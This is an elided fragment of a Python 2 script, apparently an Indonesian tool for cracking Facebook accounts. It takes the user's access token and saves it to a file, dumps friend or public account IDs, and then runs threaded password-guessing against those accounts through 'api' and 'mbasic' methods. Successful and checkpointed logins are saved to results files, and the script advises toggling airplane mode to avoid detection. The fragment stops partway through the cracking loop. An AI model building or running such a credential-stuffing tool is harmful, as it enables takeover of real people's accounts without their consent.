...
def yayanxd():
    os.system('clear')
    print (' %s%s \n %s%s \n %s%s  %s%s'%(O,N,O,N,O,N,H,N))
    kontol = raw_input('\n %s%s▬▬ι═══════ﺤ%s Token :%s '%(N,M,N,H))
    ...
    try:
        ...
        print '\n\n %s%s ▬▬ι═══════ﺤ %s%s%s'%(O,N,K,nama,N);time.sleep(2)
        print ' %s%s '%(O,N);time.sleep(2)
        open('.memek.txt', 'w').write(kontol)
        raw_input(' %s▬▬ι═══════ﺤ%s 𝑒𝑛𝑡𝑒𝑟 '%(O,N));wuhan(kontol)
...
def moch_yayan():
    ...
    IP = ipm["origin"]
    print '█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n';time.sleep(0.03)
    print '█𝗙𝗕• %s\033[0;96m█'%(nama);time.sleep(0.03)
    print '█𝗜𝗣•%s\033[0;96m█'%(IP)
    print '█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n';time.sleep(0.03)
    print '【%s1%s】\033[0;96m▬▬ι═══════ﺤ\x1b[1;97m 𝔠𝔯𝔞𝔠𝔨 𝔪𝔞𝔰𝔞𝔩\x1b[1;92m 5000'%(O,N);time.sleep(0.08)
    print '【%s2%s】▬▬ι═══════ﺤ 𝔤𝔞𝔫 𝔠𝔯𝔞𝔠𝔨'%(O,N);time.sleep(0.08)
    print '【%s3%s】▬▬ι═══════ﺤ 𝔩𝔦𝔞𝔱 𝔥𝔞𝔰𝔦𝔩'%(O,N);time.sleep(0.08)
    print '【%s0%s】▬▬ι═══════ﺤ 𝔨𝔢𝔩𝔲𝔞𝔯 %s%s'%(M,N,M,N);time.sleep(0.08)
    pepek = raw_input('\n【𝗙】 𝗠𝗘𝗡𝗨 : ')
    if pepek == '':
        print '\n %s[%s×%s] 𝙔𝘼𝙉𝙂 𝘽𝙀𝙉𝙀𝙍'%(N,M,N);time.sleep(2);moch_yayan()
    elif pepek in['','']:
        teman(kontol)
    elif pepek in['1','01']:
        publik(kontol)
...
def teman(kontol):
    ...
    try:
        mmk = raw_input('\n %s[%s?%s] 𝙉𝘼𝙈𝘼 𝙁𝙄𝙇𝙀  : '%(N,O,N))
        asw = raw_input(' %s[%s?%s] 𝙇𝙄𝙈𝙄𝙏 𝙄𝘿 \x1b[1;92m 5000   : '%(N,O,N))
        cin = ('𝗙𝗜𝗥/' + mmk + '.𝗔𝗥𝗔').replace(' ', '_')
        xxx = open(cin, 'w')
        ...
        xxx.close()
        jalan('\n\n %s[%s✓%s] 𝗦𝗨𝗞𝗦𝗘𝗦'%(N,H,N))
        print ' [%s•%s] 𝗦𝗔𝗟𝗜𝗡 𝗙𝗜𝗟𝗘 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s 𝗘𝗡𝗧𝗘𝗥%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] 𝗚𝗔𝗚𝗔𝗟 !.\n'%(N,M,N))
        raw_input(' [ %s𝗞𝗘𝗠𝗕𝗔𝗟𝗜%s ] '%(O,N));moch_yayan()
'''
...
def publik(kontol):
    ...
    try:
        csy = raw_input('\n %s[%s?%s] 𝗜𝗗 𝗙𝗕  : '%(N,O,N))
        ahh = raw_input(' %s[%s?%s] 𝗡𝗔𝗠𝗔 𝗙𝗜𝗟𝗘  : '%(N,O,N))
        ihh = raw_input(' %s[%s?%s] 𝗟𝗜𝗠𝗜𝗧 𝗜𝗗   : '%(N,O,N))
        knt = ('𝙁𝙄𝙍/' + ahh + '.𝙂𝘼𝙉𝙏𝙀𝙉𝙂').replace(' ', '_')
        xxx = open(knt, 'w')
        ...
        xxx.close()
        print ' [%s•%s] 𝙎𝘼𝙇𝙄𝙉 𝙁𝙄𝙇𝙀 ( %s%s%s )'%(O,N,M,knt,N)
        print 50 * '-'
        raw_input(' [%s 𝙀𝙉𝙏𝙀𝙍%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(knt)
...
class __crack__:
    ...
    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] 𝔪𝔞𝔰𝔲𝔨𝔞𝔫 𝔣𝔦𝔩𝔢 : '%(O,N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] 𝔱𝔬𝔱𝔞𝔩 • %s%s%s' %(O,N,M,len(self.id),N)
        except:
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu bro cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___yayanganteng___ = raw_input(' [%s?%s] 𝗮𝗽𝗮𝗸𝗮𝗵 𝗮𝗻𝗱𝗮 𝗺𝗮𝗼 𝗺𝗲𝗻𝗴𝘂𝗻𝗮𝗸𝗮𝗻 𝗸𝗮𝘁𝗮 𝘀𝗮𝗻𝗱𝗶 [𝘆/𝘁]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] 𝗴𝘂𝗻𝗮𝗸𝗮𝗻 , (𝗸𝗼𝗺𝗮) 𝘂𝗻𝘁𝘂𝗸 𝗽𝗲𝗺𝗶𝘀𝗮𝗵𝗮𝗻 𝗰𝗼𝗻𝘁𝗼𝗵 : 𝘀𝗮𝗻𝗱𝗶123,𝘀𝗮𝗻𝗱𝗶12345,𝗱𝗹𝗹. 𝘀𝗲𝘁𝗶𝗮𝗽 𝗸𝗮𝘁𝗮 𝗺𝗶𝗻𝗶𝗺𝗮𝗹 6 𝗸𝗿𝗮𝗸𝘁𝗲𝗿 𝗮𝘁𝗮𝘂 𝗹𝗲𝗯𝗶𝗵'%(N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] 𝗺𝗮𝘀𝘂𝗸𝗮𝗻 𝗸𝗮𝘁𝗮 𝘀𝗮𝗻𝗱𝗶 : '%(O,N))
                print ' [*] 𝗰𝗿𝗮𝗰𝗸 𝗱𝗲𝗻𝗴𝗲𝗻 𝘀𝗮𝗻𝗱𝗶 -> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s×%s] 𝗷𝗮𝗻𝗴𝗮𝗻 𝗸𝗼𝘀𝗼𝗻𝗴 𝗸𝗮𝘁𝗮 𝘀𝗮𝗻𝗱𝗶'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] 𝗸𝗮𝘁𝗮 𝘀𝗮𝗻𝗱𝗶 𝗺𝗲𝗻𝗶𝗺𝗮𝗹 6 𝗸𝗿𝗮𝗸𝘁𝗲𝗿'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] 𝗷𝗮𝗻𝗴𝗮𝗻 𝗸𝗼𝘀𝗼𝗻𝗴'%(N,M,N);__yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] 𝗵𝗮𝘀𝗶𝗹 𝗼𝗸 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻 𝗸𝗲 -> 𝗿𝗲𝘀𝘂𝗹𝘁𝘀3/𝗼𝗸-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] 𝗵𝗮𝘀𝗶𝗹 𝗰𝗽 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻 𝗸𝗲 -> 𝗿𝗲𝘀𝘂𝗹𝘁𝘀/𝗰𝗽-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] 𝗸𝗮𝗺𝘂 𝗯𝗶𝘀𝗮 𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗺𝗼𝗱𝗲 𝗽𝗲𝘀𝗮𝘄𝗮𝘁 33𝗱𝗲𝘁𝗶𝗸\n'%(M,N)
                            ...
                            print '\n [%s+%s] 𝗵𝗮𝘀𝗶𝗹 𝗼𝗸 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻 𝗸𝗲 -> 𝗿𝗲𝘀𝘂𝗹𝘁𝘀2/𝗼𝗸-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print ' [%s+%s] 𝗵𝗮𝘀𝗶𝗹 𝗰𝗽 𝗱𝗶𝘀𝗶𝗺𝗽𝗮𝗻 𝗸𝗲 -> 𝗿𝗲𝘀𝘂𝗹𝘁𝘀/𝗰𝗽-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] 𝗸𝗮𝗺𝘂 𝗯𝗶𝘀𝗮 𝗮𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗺𝗼𝗱𝗲 𝗽𝗲𝘀𝗮𝘄𝗮𝘁 33𝗱𝗲𝘁𝗶𝗸\n'%(M,N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                    ...
                    print '\n [ 𝔭𝔦𝔩𝔦𝔥 𝔪𝔢𝔱𝔬𝔡𝔢 𝔠𝔯𝔞𝔠𝔨 ]\n'
                    print ' [%s1%s]. 𝔪𝔢𝔱𝔬𝔡𝔢 𝔠𝔢𝔭𝔞𝔱 𝔥𝔞𝔰𝔦𝔩 𝔡𝔦𝔨𝔦𝔱'%(O,N)
                    print ' [%s2%s]. 𝔪𝔢𝔱𝔬𝔡𝔢 𝔰𝔩𝔬𝔴𝔴 𝔥𝔞𝔰𝔦𝔩 𝔟𝔞𝔫𝔶𝔞𝔨'%(O,N)
                    print ' [%s3%s]. 𝔪𝔢𝔱𝔬𝔡𝔢 𝔰𝔩𝔬𝔴𝔴 𝔬𝔨/𝔠𝔭'%(O,N)
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n   *╔═══❖•ೋ° °ೋ•❖═══╗* \n'
            print ' [%s1%s] 𝑪𝑬𝑷𝑨𝑻 '%(O,N)
            print ' [%s2%s] 𝑺𝑳𝑶𝑾𝑾𝑾 𝑳𝑨𝑴𝑩𝑨𝑻'%(O,N)
            print ' [%s3%s] 𝑺𝑳𝑶𝑾𝑾𝑾 𝑶𝑲-𝒄𝒑'%(O,N)
            print '\n   *╚═══❖•ೋ° °ೋ•❖═══╝* \n'
            self.__pler__()
        else:
    ...
    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] 【▬▬ι═══════ﺤ】 %s/%s -> 𝔬𝔨-:%s - 𝔠𝔭-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
    ...
    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s•%s] 【▬▬ι═══════ﺤ】 %s/%s -> 𝑜𝑘-:%s - 𝑐𝑝-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
    ...
    def __pler__(self):
        yan = raw_input('\n 【F】 ▬▬ι═══════ﺤ : ')
        if yan == '':
            print '\n %s[%s×%s] 𝔧𝔞𝔫𝔤𝔞𝔫 𝔨𝔬𝔰𝔬𝔫𝔤'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] 𝔥𝔞𝔰𝔦𝔩 𝔬𝔨 𝔡𝔦𝔰𝔦𝔪𝔭𝔞𝔫 𝔨𝔢 -> 𝔯𝔢𝔰𝔲𝔩𝔱𝔰/𝔬𝔨-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] 𝔥𝔞𝔰𝔦𝔩 𝔠𝔭 𝔡𝔦𝔰𝔦𝔪𝔭𝔞𝔫 𝔨𝔢 -> 𝔯𝔢𝔰𝔲𝔩𝔱𝔰/𝔠𝔭-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] 𝔞𝔫𝔡𝔞 𝔟𝔦𝔰𝔞 𝔞𝔨𝔱𝔦𝔣𝔨𝔞𝔫 𝔪𝔬𝔡𝔢 𝔭𝔢𝔰𝔞𝔴𝔞𝔱 3 𝔡𝔢𝔱𝔦𝔨\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
